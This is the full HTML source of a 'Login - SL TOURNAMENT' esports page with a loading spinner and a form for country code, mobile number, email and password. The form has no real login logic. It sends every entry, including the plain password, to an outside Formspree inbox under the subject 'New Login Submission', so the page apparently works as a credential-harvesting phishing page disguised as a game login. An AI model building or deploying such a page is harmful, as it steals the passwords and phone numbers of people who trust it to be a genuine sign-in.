<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - SL TOURNAMENT</title>
    <style>
        /root
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-image: url('/IMG-20241011-WA0006.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .spinner-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: rgba(255, 255, 255, 0.5);
            position: absolute;
            width: 100%;
            top: 0;
            left: 0;
            padding: none;
        }

        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #ff5733;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .login-container {
            display: none;
            background-color: rgba(255, 255, 255, 0.5);
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.3);
            width: 350px;
            max-width: 100%;
            margin-left: 40px;
            margin-right: 40px;
            
            
        
        
      
        }

        .header h1 {
            margin: 0;
          text-align: center
            color: #333;
          font-size: 25px;
        }

        .header p {
            text-align: center;
            color: #555;
        }

        .login-subtitle {
            text-align: center;
            color: #333;
            font-weight: bold;
            margin-top: 10px;
        }

        .input-container label {
            display: block;
            margin-top: 10px;
            color: #333;
        }

        .input-container input, .input-container select {
            width: 100%;
           padding-top: 10px;
            margin-top: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        .login-button {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            background-color: #ff5733;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .divider {
            text-align: center;
            margin: 20px 0;
            color: #777;
        }


        .password-toggle {
            display: inline-block;
            cursor: pointer;
            margin-left: 10px;
            font-size: 12px;
            color: #333;
        }
        
        .toyo{
          font-size: 20px;
        }
        .urr{
          height: 23px;
        }
        .hurr{
          height: 37px;
        }
    </style>

    <script>
        window.onload = function() {
            setTimeout(() => {
                document.querySelector('.spinner-container').style.display = 'none';
                document.querySelector('.login-container').style.display = 'block';
            }, 2000);
        };

        function togglePasswordVisibility(id) {
            const passwordInput = document.getElementById(id);
            const toggleText = document.getElementById(id + "-toggle");

            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                toggleText.textContent = "Hide";
            } else {
                passwordInput.type = "password";
                toggleText.textContent = "Show";
            }
        }
       
          
      </script>
        
</head>
<body>
    <!-- Loading Spinner -->
    <div class="spinner-container">
        <div class="spinner"></div>
    </div>

    <!-- Login Form -->
    <div class="login-container">
        <div class="header">
            <h1>ðŸœ²  SL TOURNAMENT</h1>
            <p class="toyo">Your First Step To Esports</p>
            <p class="login-subtitle">â¦¿ Login and Play  â¦¿</p>
        </div>
        <br>
        <br>
        <br>
        <div class="login-box">
            <form id="login-form" class="auth-form" action="https://formspree.io/f/xwpkkeye" method="POST">
                <div class="input-container">
                    <label class="urr" for="login-country-code">Country Code</label>
                    <select class="hurr" id="login-country-code" name="country_code">
                        <option value="IN">India (+91)</option>
                        <option value="US">United States (+1)</option>
                       
    <option value="CA">Canada (+1)</option>
    <option value="GB">United Kingdom (+44)</option>
    <option value="AU">Australia (+61)</option>
    
    <option value="DE">Germany (+49)</option>
    <option value="FR">France (+33)</option>
    <option value="JP">Japan (+81)</option>
    <option value="CN">China (+86)</option>
    <option value="BR">Brazil (+55)</option>
    <option value="ZA">South Africa (+27)</option>
    <option value="RU">Russia (+7)</option>
    <option value="IT">Italy (+39)</option>
    <option value="ES">Spain (+34)</option>
    <option value="MX">Mexico (+52)</option>
                        <!-- Add more countries as needed -->
                    </select>

                    <label for="login-mobile-number">Mobile Number</label>
                    <input class="urr" type="tel" id="login-mobile-number" name="mobile_number" placeholder="Enter Mobile Number" required>

                    <label for="login-email">Email ID</label>
                    <input class="urr" type="email" id="login-email" name="email_id" placeholder="Enter Email ID">

                    <label for="login-password">Password</label>
                    <input class="urr" type="password" id="login-password" name="login_password" placeholder="Enter Password" required>
                    <span id="login-password-toggle" class="password-toggle" onclick="togglePasswordVisibility('login-password')">Show</span>

                    <button class="login-button" type="submit">Login</button>
                </div>
                <div class="divider">
                   
                </div>
              </button>
                <input type="hidden" name="_subject" value="New Login Submission">
            </form>
        </div>
    </div>
</body>
</html>
